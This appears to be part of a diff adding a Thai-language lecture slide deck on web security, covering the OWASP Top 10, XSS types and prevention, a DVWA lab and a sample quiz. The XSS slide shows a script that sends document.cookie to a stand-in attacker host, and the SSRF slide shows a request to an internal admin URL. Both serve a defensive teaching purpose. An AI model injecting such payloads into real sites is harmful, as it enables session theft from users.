+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-indigo-400">A08: Integrity Failures (New)</h2>
+            <p class="text-center text-slate-300 max-w-3xl mb-8">
+                ความเสี่ยงเมื่อ Code หรือ Infrastructure ที่เราใช้ ถูก "แทรกแซง" จากภายนอก
+            </p>
+            <div class="glass-card p-6 w-full max-w-4xl">
+                <h3 class="font-bold text-indigo-300 text-lg mb-2">Example: SolarWinds Attack</h3>
+                <p class="text-slate-400 text-sm mb-4">
+                    Hacker เจาะเข้าระบบ Build Server ของบริษัท แล้วฝัง Backdoor ลงไปใน Update Patch ของซอฟต์แวร์ ทำให้ลูกค้าทุกคนที่กด Update โดน Hack ทั้งหมด
+                </p>
+                <div class="h-px bg-slate-600 my-4"></div>
+                <h3 class="font-bold text-indigo-300 text-lg mb-2">Insecure Deserialization</h3>
+                <p class="text-slate-400 text-sm">
+                    การแปลงข้อมูล Object (Serialize) ไปมาโดยไม่ตรวจสอบ ทำให้ Hacker แก้ไข Object นั้นเพื่อสั่งรัน Code ได้
+                </p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-slate-400">A09: Logging & Monitoring Failures</h2>
+            <div class="flex flex-col items-center">
+                <i class="fas fa-video text-6xl text-slate-500 mb-6"></i>
+                <p class="text-2xl text-white font-bold mb-4">"คุณจะรู้ได้ยังไงว่าโดน Hack... ถ้าไม่มีกล้องวงจรปิด?"</p>
+                <div class="bg-red-900/20 border border-red-500/50 p-6 rounded-xl max-w-2xl text-center">
+                    <p class="text-red-300">
+                        สถิติ: โดยเฉลี่ยองค์กรใช้เวลา <span class="text-2xl font-bold text-white">200+ วัน</span> กว่าจะรู้ตัวว่าโดนเจาะระบบ!
+                    </p>
+                </div>
+                <div class="mt-8 text-slate-400 text-sm">
+                    <p>สิ่งที่ต้องทำ: Log กิจกรรมสำคัญ (Login, Failed Access, High-value transaction) และมีระบบ Alert เมื่อเจอความผิดปกติ</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-orange-500">A10: SSRF</h2>
+            <p class="text-slate-300 mb-6">หลอกให้ Server ของเรา ไปโจมตีคนอื่น หรือดึงข้อมูลภายใน</p>
+            <div class="w-full max-w-4xl bg-slate-900 rounded-lg overflow-hidden flex border border-slate-700">
+                <div class="w-1/2 p-6 border-r border-slate-700">
+                    <h3 class="text-white font-bold mb-2">Scenario</h3>
+                    <p class="text-slate-400 text-sm mb-4">เว็บมีฟีเจอร์ "Fetch Image from URL" ให้ user ใส่ URL รูปภาพ</p>
+                    <div class="code-block text-xs">
+                        POST /api/image<br>
+                        url = <span class="text-green-400">http://example.com/pic.jpg</span>
+                    </div>
+                </div>
+                <div class="w-1/2 p-6">
+                    <h3 class="text-red-400 font-bold mb-2">The Attack</h3>
+                    <p class="text-slate-400 text-sm mb-4">Hacker ใส่ URL ที่เป็น Internal IP</p>
+                    <div class="code-block text-xs border-red-500">
+                        POST /api/image<br>
+                        url = <span class="text-red-400">http://192.168.1.1/admin</span>
+                    </div>
+                    <p class="text-xs text-slate-500 mt-2">Server จะไปดึงหน้า Admin ของ Router ภายในมาให้ Hacker ดู</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-4xl font-bold mb-8 text-transparent bg-clip-text bg-gradient-to-r from-sky-400 to-emerald-400">Recap: OWASP Top 10</h2>
+            <p class="text-xl text-slate-300 mb-8">เราได้เห็นภาพรวมทั้ง 10 ข้อแล้ว</p>
+            <div class="grid grid-cols-5 gap-4 text-center text-xs font-mono text-slate-400">
+                <div class="p-2 border border-slate-700 rounded">Access Control</div>
+                <div class="p-2 border border-slate-700 rounded">Crypto Fail</div>
+                <div class="p-2 border border-slate-700 rounded">Injection</div>
+                <div class="p-2 border border-slate-700 rounded">Insecure Design</div>
+                <div class="p-2 border border-slate-700 rounded">Misconfig</div>
+                <div class="p-2 border border-slate-700 rounded">Vulnerable Comp</div>
+                <div class="p-2 border border-slate-700 rounded">Auth Fail</div>
+                <div class="p-2 border border-slate-700 rounded">Integrity Fail</div>
+                <div class="p-2 border border-slate-700 rounded">Logging Fail</div>
+                <div class="p-2 border border-slate-700 rounded">SSRF</div>
+            </div>
+            <div class="mt-12">
+                <p class="text-lg text-white">ต่อไปเราจะเจาะลึก <strong>Cross-Site Scripting (XSS)</strong> ซึ่งมักจะเกิดคู่กับ Injection</p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-yellow-300">Cross-Site Scripting (XSS)</h2>
+            <div class="glass-card p-8 text-center max-w-3xl">
+                <p class="text-xl text-white mb-6">
+                    "การฝัง Script (JavaScript) อันตรายลงไปในหน้าเว็บ เพื่อให้ไปรันที่เครื่องของ User อื่น"
+                </p>
+                <div class="code-block text-left text-sm">
+                    <span class="code-comment">&lt;!-- Hacker comments on a post --&gt;</span><br>
+                    &lt;script&gt;<br>
+                    &nbsp;&nbsp;fetch('http://hacker.com?cookie=' + document.cookie)<br>
+                    &lt;/script&gt;
+                </div>
+                <p class="mt-4 text-red-400 font-bold">ผลกระทบ: ขโมย Session, Redirect เว็บ, แก้ไขหน้าเว็บ</p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-8 text-slate-200">ประเภทของ XSS</h2>
+            <div class="grid grid-cols-3 gap-6 w-full max-w-6xl">
+                <div class="bg-slate-800 p-6 rounded-lg border-t-4 border-yellow-400">
+                    <h3 class="font-bold text-yellow-400 text-lg mb-2">1. Stored XSS</h3>
+                    <p class="text-sm text-slate-400 mb-2">ร้ายแรงสุด</p>
+                    <p class="text-xs text-slate-500">Script ถูกบันทึกลง Database (เช่น ช่อง Comment) ทุกคนที่เข้ามาดูจะโดนหมด</p>
+                </div>
+                <div class="bg-slate-800 p-6 rounded-lg border-t-4 border-orange-400">
+                    <h3 class="font-bold text-orange-400 text-lg mb-2">2. Reflected XSS</h3>
+                    <p class="text-sm text-slate-400 mb-2">พบบ่อยสุด</p>
+                    <p class="text-xs text-slate-500">Script อยู่ใน URL (เช่น ?search=</p>script>...) ต้องหลอกให้เหยื่อคลิกลิงก์</p>
+                </div>
+                <div class="bg-slate-800 p-6 rounded-lg border-t-4 border-blue-400">
+                    <h3 class="font-bold text-blue-400 text-lg mb-2">3. DOM XSS</h3>
+                    <p class="text-sm text-slate-400 mb-2">เกิดที่ฝั่ง Client</p>
+                    <p class="text-xs text-slate-500">JavaScript ในหน้าเว็บดึงค่าจาก URL มาแสดงผลผิดพลาด โดยไม่ผ่าน Server</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-green-400">XSS Prevention</h2>
+            <div class="w-full max-w-4xl space-y-6">
+                <div class="glass-card p-6">
+                    <h3 class="text-xl font-bold text-white mb-2">1. Output Encoding (สำคัญที่สุด)</h3>
+                    <p class="text-slate-400 text-sm mb-2">แปลงอักขระพิเศษให้เป็น HTML Entity ก่อนแสดงผล</p>
+                    <div class="flex gap-4 items-center justify-center mt-2">
+                        <span class="text-red-400 bg-black px-2 py-1 rounded">&lt;script&gt;</span>
+                        <i class="fas fa-arrow-right text-slate-500"></i>
+                        <span class="text-green-400 bg-black px-2 py-1 rounded">&amp;lt;script&amp;gt;</span>
+                    </div>
+                </div>
+                <div class="glass-card p-6">
+                    <h3 class="text-xl font-bold text-white mb-2">2. Content Security Policy (CSP)</h3>
+                    <p class="text-slate-400 text-sm">HTTP Header ที่บอก Browser ว่า "อนุญาตให้รัน Script จากที่ไหนได้บ้าง"</p>
+                    <div class="code-block mt-2 text-xs">
+                        Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-4xl font-bold mb-6 text-white"><i class="fas fa-code"></i> Secure Coding Practices</h2>
+            <p class="text-xl text-slate-400 text-center max-w-2xl mb-8">
+                "Security ไม่ใช่ Feature ที่มาแปะทีหลัง แต่เป็น Mindset ในทุกบรรทัดที่เราเขียน"
+            </p>
+            <ul class="space-y-4 text-lg text-slate-200">
+                <li class="flex items-center gap-4"><i class="fas fa-check text-green-500"></i> Input Validation</li>
+                <li class="flex items-center gap-4"><i class="fas fa-check text-green-500"></i> Output Encoding</li>
+                <li class="flex items-center gap-4"><i class="fas fa-check text-green-500"></i> Authentication & Session Management</li>
+                <li class="flex items-center gap-4"><i class="fas fa-check text-green-500"></i> Error Handling & Logging</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-sky-400">Input Validation</h2>
+            <div class="flex gap-8 w-full max-w-5xl">
+                <div class="w-1/2 glass-card p-6">
+                    <h3 class="text-red-400 font-bold mb-2">Blacklisting (Bad)</h3>
+                    <p class="text-sm text-slate-400 mb-4">"ห้ามคำว่า script, ห้ามคำว่า admin"</p>
+                    <p class="text-xs text-slate-500">Hacker หาทางเลี่ยงได้เสมอ (เช่น ScRiPt, scr&ipt)</p>
+                </div>
+                <div class="w-1/2 glass-card p-6 border border-emerald-500">
+                    <h3 class="text-emerald-400 font-bold mb-2">Whitelisting (Good)</h3>
+                    <p class="text-sm text-slate-400 mb-4">"อนุญาตเฉพาะสิ่งที่ถูกต้องเท่านั้น"</p>
+                    <p class="text-xs text-slate-500">เช่น "รับเฉพาะตัวเลข 0-9", "รับเฉพาะอีเมลที่ถูก format"</p>
+                    <div class="code-block mt-4 text-xs">
+                        if (!/^[a-zA-Z0-9]+$/.test(username)) {<br>
+                        &nbsp;&nbsp;throw new Error("Invalid username");<br>
+                        }
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-8 text-white">Security Testing Tools</h2>
+            <p class="mb-6 text-slate-400">เครื่องมือที่ Software Engineer ควรรู้จัก (และ Hacker ก็ใช้)</p>
+            <div class="grid grid-cols-2 gap-8 w-full max-w-4xl">
+                <div class="bg-orange-600/20 p-6 rounded-xl border border-orange-500/50 flex items-center gap-6">
+                    <div class="text-5xl text-orange-500"><i class="fas fa-bug"></i></div>
+                    <div>
+                        <h3 class="font-bold text-xl text-orange-400">Burp Suite</h3>
+                        <p class="text-sm text-slate-300">เครื่องมือ No.1 สำหรับ Web Penetration Testing (Intercept Proxy)</p>
+                    </div>
+                </div>
+                <div class="bg-blue-600/20 p-6 rounded-xl border border-blue-500/50 flex items-center gap-6">
+                    <div class="text-5xl text-blue-500"><i class="fas fa-bolt"></i></div>
+                    <div>
+                        <h3 class="font-bold text-xl text-blue-400">OWASP ZAP</h3>
+                        <p class="text-sm text-slate-300">Scanner ฟรีจาก OWASP ใช้งานง่าย เหมาะกับผู้เริ่มต้น</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-emerald-400">🧪 Lab 3: Web Security Exercise</h2>
+            <div class="glass-card p-8 max-w-3xl w-full">
+                <h3 class="text-xl font-bold text-white mb-4">ภารกิจของคุณ:</h3>
+                <ul class="space-y-3 text-slate-300 tech-list">
+                    <li>เข้าใช้งาน <strong>DVWA (Damn Vulnerable Web App)</strong> ที่เตรียมไว้ให้</li>
+                    <li>ทดลองโจมตี SQL Injection เพื่อ Bypass Login</li>
+                    <li>ทดลองทำ Reflected XSS เพื่อแสดง Alert Box</li>
+                    <li><strong>Report:</strong> แคปภาพหน้าจอและอธิบายขั้นตอน พร้อมเสนอวิธีแก้ไข (Remediation)</li>
+                </ul>
+                <div class="mt-6 p-4 bg-slate-800 rounded text-center text-yellow-400 text-sm">
+                    ⚠️ คำเตือน: ห้ามทดสอบกับเว็บจริงภายนอกเด็ดขาด ผิด พ.ร.บ. คอมพิวเตอร์!
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-purple-400">📝 Quiz Week 7</h2>
+            <div class="w-full max-w-4xl">
+                <p class="text-center text-slate-300 mb-8">ตัวอย่างคำถามเตรียมสอบ</p>
+                <div class="space-y-4">
+                    <div class="bg-slate-800 p-4 rounded hover:bg-slate-700 transition cursor-pointer">
+                        <p class="font-bold text-white">1. OWASP Top 10 อันดับ 1 ในปี 2021 คือ?</p>
+                        <p class="text-slate-400 text-sm mt-1 ml-4">a) SQL Injection</p>
+                        <p class="text-emerald-400 text-sm mt-1 ml-4">b) Broken Access Control (ถูกต้อง)</p>
+                        <p class="text-slate-400 text-sm mt-1 ml-4">c) XSS</p>
+                    </div>
+                    <div class="bg-slate-800 p-4 rounded hover:bg-slate-700 transition cursor-pointer">
+                        <p class="font-bold text-white">2. การป้องกัน SQL Injection ที่ดีที่สุดคือ?</p>
+                        <p class="text-emerald-400 text-sm mt-1 ml-4">a) Parameterized Queries (ถูกต้อง)</p>
+                        <p class="text-slate-400 text-sm mt-1 ml-4">b) Input Sanitization</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-red-500">Case Study: Equifax Breach (2017)</h2>
+            <div class="glass-card p-8 max-w-4xl">
+                <div class="flex gap-6">
+                    <div class="text-4xl text-red-500"><i class="fas fa-file-invoice-dollar"></i></div>
+                    <div>
+                        <h3 class="text-xl font-bold text-white mb-2">ความเสียหาย</h3>
+                        <p class="text-slate-300">ข้อมูลส่วนตัวคนอเมริกัน 147 ล้านคนรั่วไหล (SSN, วันเกิด, ที่อยู่)</p>
+                    </div>
+                </div>
+                <div class="h-px bg-slate-600 my-6"></div>
+                <h3 class="text-lg font-bold text-yellow-400 mb-2">สาเหตุ (Root Cause)</h3>
+                <p class="text-slate-300 mb-4">
+                    เกิดจาก <strong>A06: Vulnerable and Outdated Components</strong><br>
+                    บริษัทใช้ Apache Struts เวอร์ชันที่มีช่องโหว่ (CVE-2017-5638) และไม่ได้ Patch นานกว่า 2 เดือน ทั้งที่มี Patch ออกมาแล้ว
+                </p>
+                <p class="text-sm text-slate-400 italic">Lesson Learned: การ Update Software สำคัญเท่ากับการเขียน Code</p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-blue-400">Beyond Code: HTTPS & HSTS</h2>
+            <div class="text-center max-w-3xl">
+                <i class="fas fa-lock text-6xl text-green-400 mb-6"></i>
+                <p class="text-lg text-slate-300 mb-6">
+                    เราเขียน Code ดีแค่ไหน แต่ถ้าส่งผ่าน HTTP ก็จบเห่
+                </p>
+                <div class="text-left space-y-4 glass-card p-6">
+                    <div>
+                        <h4 class="font-bold text-white">TLS (Transport Layer Security)</h4>
+                        <p class="text-sm text-slate-400">มาตรฐานปัจจุบัน (มาแทน SSL) เข้ารหัสข้อมูลระหว่างทาง</p>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-white">HSTS (HTTP Strict Transport Security)</h4>
+                        <p class="text-sm text-slate-400">Header ที่บังคับให้ Browser เรียกเว็บผ่าน HTTPS เท่านั้น (ป้องกัน SSL Stripping)</p>
+                        <div class="code-block mt-2 text-xs">Strict-Transport-Security: max-age=31536000; includeSubDomains</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+         <div class="slide">
+            <h2 class="text-3xl font-bold mb-8 text-white">📊 Assessment Summary</h2>
+            <table class="w-full max-w-4xl text-left border-collapse">
+                <thead>
+                    <tr class="border-b border-slate-600">
+                        <th class="p-4 text-sky-400">รายการ</th>
+                        <th class="p-4 text-sky-400">คะแนน</th>
+                        <th class="p-4 text-sky-400">รายละเอียด</th>
+                    </tr>
+                </thead>
+                <tbody class="text-slate-300">
+                    <tr class="border-b border-slate-700 bg-slate-800/30">
+                        <td class="p-4">Lab 3 Report</td>
+                        <td class="p-4 font-mono">10</td>
+                        <td class="p-4">รายงานผลการทดลอง Web Security (DVWA)</td>
+                    </tr>
+                    <tr class="border-b border-slate-700">
+                        <td class="p-4">Quiz Week 7</td>
+                        <td class="p-4 font-mono">10</td>
+                        <td class="p-4">ทดสอบความเข้าใจ OWASP Top 10</td>
+                    </tr>
+                    <tr class="border-b border-slate-700 bg-slate-800/30">
+                        <td class="p-4">Participation</td>
+                        <td class="p-4 font-mono">5</td>
+                        <td class="p-4">การมีส่วนร่วมในคลาส</td>
+                    </tr>
+                    <tr class="font-bold text-white bg-sky-900/20">
+                        <td class="p-4 text-right">รวม</td>
+                        <td class="p-4 font-mono text-xl text-sky-400">25</td>
+                        <td class="p-4">คะแนน</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-4xl font-bold mb-8 text-white">Conclusion</h2>
+            <div class="grid grid-cols-2 gap-8 max-w-5xl">
+                <div class="bg-slate-800 p-8 rounded-xl flex flex-col justify-center">
+                    <h3 class="text-2xl font-bold text-sky-400 mb-4">Key Takeaways</h3>
+                    <ul class="space-y-3 text-slate-300">
+                        <li>✅ Web App เป็นเป้าหมายหลักของการโจมตี</li>
+                        <li>✅ OWASP Top 10 คือคัมภีร์ที่ต้องรู้</li>
+                        <li>✅ Never Trust User Input (Validate & Sanitize)</li>
+                        <li>✅ Security is a continuous process</li>
+                    </ul>
+                </div>
+                <div class="flex items-center justify-center">
+                    <div class="text-center">
+                        <i class="fas fa-shield-virus text-8xl text-emerald-400 mb-6 animate-pulse"></i>
+                        <p class="text-xl text-slate-400">"สร้าง Software ให้ปลอดภัย<br>เพื่อปกป้องข้อมูลของผู้ใช้งาน"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <div class="flex flex-col items-center justify-center h-full">
+                <h2 class="text-6xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-600 mb-8">
+                    Q & A
+                </h2>
+                <p class="text-2xl text-slate-300 mb-8">มีข้อสงสัยสอบถามได้เลยครับ</p>
+                <div class="animate-bounce mt-8">
+                    <i class="fas fa-question-circle text-6xl text-slate-600"></i>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2 class="text-3xl font-bold mb-6 text-slate-400">Next Week...</h2>
+            <div class="relative w-full max-w-4xl h-64 bg-black rounded-xl overflow-hidden flex items-center justify-center border border-slate-800">
+                <div class="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1558494949-efc02570fbc9?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80')] bg-cover opacity-30"></div>
+                <div class="relative z-10 text-center">
+                    <h1 class="text-5xl font-bold text-white mb-2">API Security</h1>
+                    <h2 class="text-2xl text-sky-400">& JSON Web Tokens (JWT)</h2>
+                    <p class="mt-4 text-slate-300">เตรียมตัวเรียนรู้วิธีการยืนยันตัวตนใน Modern Web App</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="slide">
+            <h2 class="text-4xl font-bold text-white mb-4">Thank You</h2>
+            <p class="text-slate-400 text-xl">ENGSE214 – ความมั่นคงปลอดภัยทางไซเบอร์เบื้องต้น</p>
+            <div class="mt-12 flex gap-4">
+                <a href="#" class="px-6 py-3 bg-slate-800 hover:bg-slate-700 rounded text-white transition"><i class="fab fa-github mr-2"></i>Download Slides</a>
+                <a href="#" class="px-6 py-3 bg-sky-600 hover:bg-sky-500 rounded text-white transition"><i class="fas fa-envelope mr-2"></i>Contact Lecturer</a>
+            </div>
+            <button onclick="location.reload()" class="mt-20 text-slate-600 hover:text-white transition text-sm">
+                <i class="fas fa-redo mr-1"></i> Start Over
+            </button>
+        </div>
+
+    </div>
+
+    <div class="controls-area" id="controls">
+        <button class="btn-ctrl" onclick="prevSlide()" title="Previous"><i class="fas fa-chevron-left"></i></button>
+        <button class="btn-ctrl" onclick="zoomOut()" title="Zoom Out"><i class="fas fa-search-minus"></i></button>
+        <button class="btn-ctrl" onclick="toggleFullScreen()" title="Fullscreen"><i class="fas fa-expand"></i></button>
+        <button class="btn-ctrl" onclick="zoomIn()" title="Zoom In"><i class="fas fa-search-plus"></i></button>
+        <button class="btn-ctrl" onclick="nextSlide()" title="Next"><i class="fas fa-chevron-right"></i></button>
+    </div>
+
+    <div class="slide-indicator" id="slideNum">1 / 36</div>
+
+    <script>
+        // State
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const progressBar = document.getElementById('progressBar');
+        const slideNumDisplay = document.getElementById('slideNum');
+        const container = document.getElementById('slide-container');
+        let zoomLevel = 1;
+
+        // Init
+        updateSlide();
+
+        // Functions
+        function updateSlide() {
+            slides.forEach((slide, index) => {
+                slide.classList.remove('active', 'prev');
+                if (index === currentSlide) {
+                    slide.classList.add('active');
+                } else if (index < currentSlide) {
+                    slide.classList.add('prev');
+                }
+            });
+            
+            // Update Progress
+            const progress = ((currentSlide + 1) / slides.length) * 100;
+            progressBar.style.width = `${progress}%`;
+            
+            // Update Number
+            slideNumDisplay.textContent = `${currentSlide + 1} / ${slides.length}`;
+
+            // Animation trigger for numbers (simple count up effect re-trigger)
+            const countUps = slides[currentSlide].querySelectorAll('.count-up');
+            countUps.forEach(el => {
+                const target = parseInt(el.getAttribute('data-target'));
+                let count = 0;
+                const duration = 1000;
+                const step = target / (duration / 16);
+                const timer = setInterval(() => {
+                    count += step;
+                    if(count >= target) {
+                        el.innerText = target + '%';
+                        clearInterval(timer);
+                    } else {
+                        el.innerText = Math.floor(count) + '%';
+                    }
+                }, 16);
+            });
+        }
+
+        function nextSlide() {
+            if (currentSlide < slides.length - 1) {
+                currentSlide++;
+                updateSlide();
+            }
+        }
+
+        function prevSlide() {
+            if (currentSlide > 0) {
+                currentSlide--;
+                updateSlide();
+            }
+        }
+
+        function toggleFullScreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+            }
+        }
+
+        function zoomIn() {
+            if(zoomLevel < 1.5) {
+                zoomLevel += 0.1;
+                container.style.transform = `scale(${zoomLevel})`;
+                container.style.transformOrigin = 'center center';
+            }
+        }
+
+        function zoomOut() {
+            if(zoomLevel > 0.5) {
+                zoomLevel -= 0.1;
+                container.style.transform = `scale(${zoomLevel})`;
+                container.style.transformOrigin = 'center center';
+            }
+        }
+
+        // Event Listeners
+        document.addEventListener('keydown', (e) => {
+            if (e.code === 'ArrowRight' || e.code === 'Space') {
+                nextSlide();
+            } else if (e.code === 'ArrowLeft') {
+                prevSlide();
+            } else if (e.code === 'KeyF') {
+                toggleFullScreen();
+            }
+        });
+
+        // Hide controls on idle
+        let timeout;
+        const controls = document.getElementById('controls');
+        document.onmousemove = function(){
+            controls.style.opacity = 1;
+            clearTimeout(timeout);
+            timeout = setTimeout(function(){ controls.style.opacity = 0.3; }, 3000);
+        }
+    </script>
+</body>
+</html>
